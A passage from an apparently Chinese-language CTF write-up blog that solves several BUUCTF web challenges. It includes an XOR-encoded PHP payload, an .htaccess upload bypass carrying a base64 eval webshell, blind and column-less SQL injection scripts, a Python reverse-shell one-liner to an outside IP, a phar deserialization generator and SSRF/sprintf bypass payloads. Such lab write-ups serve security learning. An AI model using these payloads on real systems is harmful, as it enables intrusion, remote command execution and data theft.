class="string">&quot;%ff&quot;</span>;</span><br><span class="line">                <span class="variable">$r</span> .= <span class="string">&quot;%0&quot;</span> . dechex(<span class="variable">$j</span>);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$l</span> .= <span class="string">&quot;%ff&quot;</span>;</span><br><span class="line">            <span class="variable">$r</span> .= <span class="string">&quot;%&quot;</span> . dechex(<span class="variable">$j</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\&#123;<span class="subst">$l</span>`<span class="subst">$r</span>\&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload1:</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;<span class="meta">%</span>A<span class="number">0</span><span class="meta">%</span>B<span class="number">8</span><span class="meta">%</span>BA<span class="meta">%</span>AB^<span class="meta">%</span>ff<span class="meta">%</span>ff<span class="meta">%</span>ff<span class="meta">%</span>ff&#125;&#123;<span class="meta">%</span>A<span class="number">0</span>&#125;<span class="comment">()</span>;&amp;<span class="meta">%</span>A<span class="number">0</span>=get_the_flag</span><br></pre></td></tr></table></figure>




<p>第二关</p>
<blockquote>
<p>首先对文件后缀进行正则检查 , 如果文件后缀是以 “ ph “ 开头 , 则不通过检测 .</p>
<p>然后对文件内容进行检查 , 如果文件内容中出现 “ &lt;? “ 这个部分 , 则不通过检测 .</p>
<p>最后通过 exif_imagetype() 函数对文件类型进行检查 , 如果文件不是一张图片 , 则不通过检测 .</p>
</blockquote>
<p><strong>PHP版本是 PHP 7.2 , 所以<code>&lt;script language=&#39;php&#39;&gt; ... &lt;/script&gt;</code>这种写法已无法使用 . 要想绕过 “ &lt;? “ 的检测 , 必须对文件内容进行编码(比如base64)再上传</strong> .</p>
<p> 找到一种能够同时满足 图片文件 . PHP文件 , .htaccess文件 的文件格式 . <strong>要满足PHP文件和配置文件的格式 ，就需要添加文件的 “ 不解析行 “ 了( 比如注释行 )</strong></p>
<p><strong>X-Bitmap(XBM)是一种古老但通用的图像文件格式 , 它与现在的许多Web浏览器都兼容 . X-Windows图形界面(UNIX和Linux常用的GUI)的C代码库xlib中有一个组件专门描述了它的规范 .</strong></p>
<p><strong>XBM 文件头是通过两行 #define 定义的 , 而这种定义方式刚好在 php文件 和 .htaccess文件 中代表注释</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.htaccess</span><br><span class="line"></span><br><span class="line">#define width 1337</span><br><span class="line">#define height 1337 </span><br><span class="line">AddType application&#x2F;x-httpd-php .aaa</span><br><span class="line">php_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;.&#x2F;shell.aaa&quot;</span><br></pre></td></tr></table></figure>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">shell</span>.aaa:</span><br><span class="line"></span><br><span class="line"><span class="attribute">GIF89a12</span>		#<span class="number">12</span>是为了补足<span class="number">8</span>个字节，满足base<span class="number">64</span>编码的规则</span><br><span class="line"><span class="attribute">PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NtZCddKTs</span>/Pg==</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#paylaod</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">htaccess = <span class="string">b&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">#define width 1337</span></span><br><span class="line"><span class="string">#define height 1337 </span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .ahhh</span></span><br><span class="line"><span class="string">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.aaa&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">shell = <span class="string">b&quot;GIF89a12&quot;</span> + base64.b64encode(<span class="string">b&quot;&lt;?php eval($_REQUEST[&#x27;cmd&#x27;]);?&gt;&quot;</span>)</span><br><span class="line">url = <span class="string">&quot;http://be57968d-71f2-4a55-afda-5d2b4348fcc7.node3.buuoj.cn/?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=get_the_flag&quot;</span></span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;.htaccess&#x27;</span>,htaccess,<span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">data = &#123;<span class="string">&quot;upload&quot;</span>:<span class="string">&quot;Submit&quot;</span>&#125;</span><br><span class="line">response = requests.post(url=url, data=data, files=files)</span><br><span class="line">print(response.text)</span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;shell.aaa&#x27;</span>,shell,<span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">response = requests.post(url=url, data=data, files=files)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>


<p>第三关：</p>
<p>bypass  open_basedir</p>
<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">chdir</span>(<span class="string">&#x27;img&#x27;</span>);<span class="selector-tag">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);<span class="selector-tag">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="selector-tag">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="selector-tag">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="selector-tag">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="selector-tag">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);<span class="selector-tag">echo</span>(file_get_contents(<span class="string">&#x27;flag&#x27;</span>));</span><br></pre></td></tr></table></figure>


<p><a href="https://www.guildhab.top/?p=677" target="_blank">大佬对这个题的分析，写的挺详细的</a></p>
<h2 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020] Ezsqli"></a>[GYCTF2020] Ezsqli</h2><p><strong>知识点：</strong></p>
<ol>
<li> <strong>bypass information_schema</strong></li>
<li> <strong>无列名注入</strong></li>
</ol>
<p><strong>由于performance_schema过于复杂，所以mysql在5.7版本中新增了sys 数据库，基础数据来自于performance_chema和information_schema两个库，本身数据库不存储数据。</strong></p>
<p><strong>sys数据库中的以下三个视图中存储了表名table_name:</strong></p>
<ul>
<li><strong>sys.schema_auto_increment_columns #存在自增主键的表会出现在此视图</strong></li>
<li><strong>sys.schema_table_statistics_with_buffer #数据来源视图</strong></li>
<li><strong>sys.x$schema_table_statistics_with_buffer #数据来源视图</strong></li>
</ul>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> <span class="built_in">string</span></span><br><span class="line">url=<span class="string">&quot;http://334f9701-ac6e-4158-b91b-450d336d1ca1.node3.buuoj.cn/&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">1</span>,<span class="number">50</span>):<span class="meta">#flag长度</span></span><br><span class="line">    <span class="built_in">print</span>(i,<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    low=<span class="number">32</span></span><br><span class="line">    high=<span class="number">128</span></span><br><span class="line">    mid = (low+high)<span class="comment">//2</span></span><br><span class="line">    <span class="keyword">while</span> low&lt;=high:</span><br><span class="line">        <span class="meta">#print(mid)</span></span><br><span class="line">    <span class="meta">#for j in range(32,128):#可见字符长度</span></span><br><span class="line">    	<span class="meta">#payload=<span class="meta-string">&quot;0^(ascii(substr(select database()),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;</span>.format(i,mid)</span></span><br><span class="line">    	<span class="meta">#payload=<span class="meta-string">&quot;0^(ascii(substr(select version()),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;</span>.format(i,mid)</span></span><br><span class="line">        <span class="meta">#payload=<span class="meta-string">&quot;0^(ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;</span>.format(i,mid)</span></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>:payload</span><br><span class="line">            &#125;</span><br><span class="line">        t = requests.post(url,data=data)</span><br><span class="line">        <span class="meta">#print(t.apparent_encoding)</span></span><br><span class="line">        t.encoding=<span class="string">&quot;Windows-1252&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(t.<span class="built_in">text</span>)</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;Nu1L&quot;</span> in t.<span class="built_in">text</span>):</span><br><span class="line">            low=mid+<span class="number">1</span></span><br><span class="line">            mid = (low+high)<span class="comment">//2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high=mid<span class="number">-1</span></span><br><span class="line">            mid = (low+high)<span class="comment">//2</span></span><br><span class="line">    flag+=chr(high+<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    </span><br><span class="line">爆出表名为f1ag_1s_h3r3_hhhhh</span><br></pre></td></tr></table></figure>
<p>盲猜列名为flag ，直接得到flag</p>
<p>2.无列名注入</p>
<p>在这里用到的是逐字符检索数据法</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (select 1,<span class="emphasis">&#x27;c&#x27;</span>) &gt; (select * from users limit 0,1);</span><br><span class="line"><span class="code">+------------------------------------------------------------+</span></span><br><span class="line">| (select 1,<span class="emphasis">&#x27;c&#x27;</span>) &gt; (select * from users limit 0,1)           |</span><br><span class="line"><span class="code">+------------------------------------------------------------+</span></span><br><span class="line">|                              0                             |</span><br><span class="line"><span class="code">+------------------------------------------------------------+</span></span><br><span class="line">mysql&gt; select (select 1,<span class="emphasis">&#x27;d&#x27;</span>) &gt; (select * from users limit 0,1);</span><br><span class="line"><span class="code">+------------------------------------------------------------+</span></span><br><span class="line">| (select 1,<span class="emphasis">&#x27;d&#x27;</span>) &gt; (select * from users limit 0,1)           |</span><br><span class="line"><span class="code">+------------------------------------------------------------+</span></span><br><span class="line">|                              1                             |</span><br><span class="line"><span class="code">+------------------------------------------------------------+</span></span><br><span class="line"><span class="comment">//说明第二个字段的第一位是c,以此类推</span></span><br></pre></td></tr></table></figure>


<p>paylaod:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url=<span class="string">&quot;http://334f9701-ac6e-4158-b91b-450d336d1ca1.node3.buuoj.cn/&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    print(j,<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">128</span></span><br><span class="line">    mid=(low+high)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> low &lt;=high:</span><br><span class="line">        print(mid)</span><br><span class="line">        flag1=flag+<span class="built_in">chr</span>(mid)</span><br><span class="line">        payload=<span class="string">&quot;0^((1,&#x27;&#123;0&#125;&#x27;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&quot;</span>.<span class="built_in">format</span>(flag1)</span><br><span class="line">        data=&#123;</span><br><span class="line">                <span class="string">&quot;id&quot;</span>:payload</span><br><span class="line">                &#125;</span><br><span class="line">        t = requests.post(url,data=data)</span><br><span class="line">        t.encoding=<span class="string">&quot;Windows-1252&quot;</span></span><br><span class="line">        <span class="comment">#print(t.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Nu1L&quot;</span> <span class="keyword">in</span> t.text:</span><br><span class="line">            high=mid-<span class="number">1</span></span><br><span class="line">            mid=(low+high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">            mid=(low+high)//<span class="number">2</span>       </span><br><span class="line">    print(flag,<span class="built_in">chr</span>(high))</span><br><span class="line">    flag+=<span class="built_in">chr</span>(high)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="V-amp-N2020-公开赛-CHECKIN"><a href="#V-amp-N2020-公开赛-CHECKIN" class="headerlink" title="[V&amp;N2020 公开赛]CHECKIN"></a>[V&amp;N2020 公开赛]CHECKIN</h2><p><strong>知识点：</strong></p>
<ol>
<li><strong>反弹shll</strong></li>
<li><strong>/proc/[pid]/fd</strong></li>
</ol>
<p>1.反弹shell </p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://c<span class="number">936</span>c<span class="number">7</span>ee-<span class="number">5778</span>-<span class="number">4</span>eab-afc<span class="number">5</span>-<span class="number">1</span>b<span class="number">1</span>e<span class="number">3</span>ce<span class="number">54106</span>.node<span class="number">3</span>.buuoj.cn/shell?c=python<span class="number">3</span> -c <span class="string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;172.16.189.110&#x27;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span></span><br></pre></td></tr></table></figure>
<ol start="2">
<li>/proc/[pid]/fd</li>
</ol>
<p><strong>当程序打开一个文件, 会获得程序的文件描述符, 而此时如果文件被删除, 只会删除文件的目录项, 不会清空文件的内容, 原来的进程依然可以通过描述符对文件进行读取, 也就是说, 文件还存在内存里。</strong></p>
<p><strong>在 linux 系统中如果一个程序打开了一个文件没有关闭，即便从外部（上文是利用 rm -f flag.txt）删除之后，在 /proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的 fd，通过这个我们即可得到被删除文件的内容。</strong></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu9.jpg"></p>
<h2 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h2><p>考察点：phar反序列化</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$c</span>-&gt;params=<span class="keyword">array</span>(<span class="string">&#x27;source&#x27;</span>=&gt;<span class="string">&#x27;var/www/html/f1ag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$b</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> C1e4r();</span><br><span class="line"><span class="variable">$a</span>-&gt;str=<span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);  <span class="comment">//生成phar文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$a</span>);   <span class="comment">//触发头</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);   <span class="comment">//生成签名</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>






<h2 id="BJDCTF-2nd-文件探测"><a href="#BJDCTF-2nd-文件探测" class="headerlink" title="[BJDCTF 2nd]文件探测"></a>[BJDCTF 2nd]文件探测</h2><p>知识点：</p>
<ol>
<li>文件包含</li>
<li>SSRF</li>
<li>session伪造</li>
</ol>
<p>1.文件包含</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">home.php?file=php:<span class="regexp">//</span>filter<span class="regexp">/convert.base64-encode/</span>resource=system</span><br></pre></td></tr></table></figure>


<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$filter1</span> = <span class="string">&#x27;/^http:\/\/127\.0\.0\.1\//i&#x27;</span>;</span><br><span class="line"><span class="variable">$filter2</span> = <span class="string">&#x27;/.?f.?l.?a.?g.?/i&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;q1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;q2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;q3&#x27;</span>]) ) &#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;q2&#x27;</span>].<span class="string">&quot;.y1ng.txt&quot;</span>;</span><br><span class="line">    <span class="variable">$method</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;q3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str1</span> = <span class="string">&quot;~$ python fuck.py -u \&quot;&quot;</span>.<span class="variable">$url</span> .<span class="string">&quot;\&quot; -M <span class="subst">$method</span> -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="variable">$filter1</span>, <span class="variable">$url</span>) )&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$str2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="variable">$filter2</span>, <span class="variable">$url</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$str3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/^GET/i&#x27;</span>, <span class="variable">$method</span>) &amp;&amp; !preg_match(<span class="string">&#x27;/^POST/i&#x27;</span>, <span class="variable">$method</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$str4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$detect</span> = @file_get_contents(<span class="variable">$url</span>, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">print</span>(sprintf(<span class="string">&quot;<span class="subst">$url</span> method&amp;content_size:<span class="subst">$method</span>%d&quot;</span>, <span class="variable">$detect</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>2.SSRF</p>
<ol>
<li>根据上面代码，我们可以分析得到：<ul>
<li>q1 没有限制</li>
<li>q2 要以 <a target="_blank" rel="noopener" href="http://127.0.0.1开头,且后面会连接一个/">http://127.0.0.1开头，且后面会连接一个</a> y1ng.txt 然后可以被返回。</li>
<li>q3 必须是GET或者POST 开头</li>
</ul>
</li>
<li>基本上可以判定是ssrf了，有几个地方需要绕过一下：<ul>
<li>q2会被加上y1ng.txt 怎么才能让他的连接不起作用呢。</li>
<li>sprintf将q2输出格式是%d 也就是输出不完整，我们需要%s 来输出。</li>
</ul>
</li>
</ol>
<p><strong>去掉url拼接的.y1ng.txt</strong></p>
<p> <strong>我们只需要将后面接一个不存在的get参数就可以绕过了。例如：<code>http://127.0.0.1/xxxxxxxx.php?mayi=666y1ng.txt</code> 他最后显示的页面还是<code>http://127.0.0.1/xxxxxxxx.php</code> 这样就可以成功绕过了。</strong><br> <strong>同时还可以利用锚点</strong><br><code>http://127.0.0.1/xxxxxxxx.php#666y1ng.txt</code></p>
<p><strong>sprintf输出格式问题</strong></p>
<p><strong><code>sprintf(&quot;$url method&amp;content_size:$method%d&quot;, $detect)</code>我们可以知道 %d 前面还有一个可以控制的变量，也就是我们传入的<code>q3</code>。经过了解，我们知道在sprintf这里面 <code>%</code> 才是转义字符，我们可以传入<code>POST%s%</code>最后把<code>%d</code>给取消转义。达到绕过效果</strong></p>
<p><strong>还有一种方法 %1$s  ——  这种办法原理是%1$s会将第一个参数用string类型输出，这道题中第一个参数便是admin.php的源码</strong></p>
<p>payload：</p>
<blockquote>
<p>q1=1&amp;q2=<a target="_blank" rel="noopener" href="http://127.0.0.1/admin.php#&amp;q3=GET%1$s">http://127.0.0.1/admin.php#&amp;q3=GET%1$s</a> </p>
</blockquote>
<p>3.session伪造</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$f1ag</span> = ‘f1ag&#123;s1mpl3_SSRF_@nd_spr1ntf&#125;‘; <span class="comment">//fake</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aesEn</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$method</span> = ‘AES<span class="number">-128</span>-CBC‘;</span><br><span class="line">    <span class="variable">$iv</span> = md5(<span class="variable">$_SERVER</span>[‘REMOTE_ADDR‘],<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span>  base64_encode(openssl_encrypt(<span class="variable">$data</span>, <span class="variable">$method</span>,<span class="variable">$key</span>, OPENSSL_RAW_DATA , <span class="variable">$iv</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[‘your_ip_address‘]) &amp;&amp; <span class="variable">$_COOKIE</span>[‘your_ip_address‘] === md5(<span class="variable">$_SERVER</span>[‘REMOTE_ADDR‘]) &amp;&amp; <span class="variable">$_COOKIE</span>[‘y1ng‘] === sha1(md5(‘y1ng‘)))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( <span class="variable">$_SERVER</span>[‘REMOTE_ADDR‘] == <span 